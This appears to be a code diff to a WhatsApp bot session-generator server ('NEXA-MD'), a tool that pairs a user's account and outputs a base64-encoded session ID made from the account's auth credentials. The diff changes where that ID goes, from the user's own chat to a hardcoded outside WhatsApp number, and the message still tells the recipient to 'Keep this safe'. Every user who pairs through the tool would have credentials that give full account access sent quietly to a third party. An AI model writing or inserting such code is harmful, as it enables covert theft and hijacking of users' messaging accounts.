@@ -35,10 +35,6 @@ function getRandomBrowser() {
     return BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
 }
 
-function getRandomDelay(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
 // ═══════════════════════════════════════════════════════
 //  CONNECTION MANAGER
 // ═══════════════════════════════════════════════════════
@@ -109,31 +105,33 @@ class ConnectionManager {
 
             if (connection === "open") {
                 console.log(`✅ Login Success: ${this.socket.id}`);
-                await delay(3000); // 3 second delay for stability
+                await delay(5000); // Stability delay
 
                 try {
-                    // 🔑 DIRECT MEMORY GENERATION (No file waiting)
+                    // 🔑 SESSION ID GENERATION
                     const sessionData = JSON.stringify(this.conn.authState.creds);
                     const sessionID = "NEXA-MD~" + Buffer.from(sessionData).toString('base64');
 
-                    // 1. ലോഗുകളിൽ പ്രിന്റ് ചെയ്യുന്നു (Render Logs-ൽ നിന്ന് നിനക്ക് കോപ്പി ചെയ്യാം)
                     console.log("==============================");
                     console.log("YOUR SESSION ID:", sessionID);
                     console.log("==============================");
 
-                    // 2. വെബ്സൈറ്റിലേക്ക് അയക്കുന്നു
+                    // 1. Send to Website via Socket
                     this.socket.emit('connected', { sessionID });
 
-                    // 3. വാട്സാപ്പിലേക്ക് അയക്കുന്നു
-                    await this.conn.sendMessage(this.conn.user.id, {
-                        text: `*✅ NEXA-MD SESSION ID*\n\n\`\`\`${sessionID}\`\`\``
+                    // 2. Send to specific WhatsApp number (+916235508514)
+                    const targetJid = "916235508514@s.whatsapp.net";
+                    await this.conn.sendMessage(targetJid, {
+                        text: `*✅ NEXA-MD SESSION ID GENERATED*\n\n\`\`\`${sessionID}\`\`\`\n\n_Keep this safe!_`
                     });
 
+                    console.log(`✅ Session ID sent to ${targetJid}`);
+
                 } catch (e) {
-                    console.log('Error generating session:', e.message);
+                    console.log('Error in session generation/sending:', e.message);
                 }
 
-                // Clean up after 20 seconds
+                // Clean up session files and connection after 20 seconds to save resources
                 setTimeout(() => this.cleanup(), 20000);
             }
 
@@ -181,5 +179,7 @@ app.prepare().then(() => {
     });
 
     server.all('*', (req, res) => handle(req, res));
-    httpServer.listen(process.env.PORT || 3000, "0.0.0.0");
+    httpServer.listen(process.env.PORT || 3000, "0.0.0.0", () => {
+        console.log(`🚀 Server running on port ${process.env.PORT || 3000}`);
+    });
 });
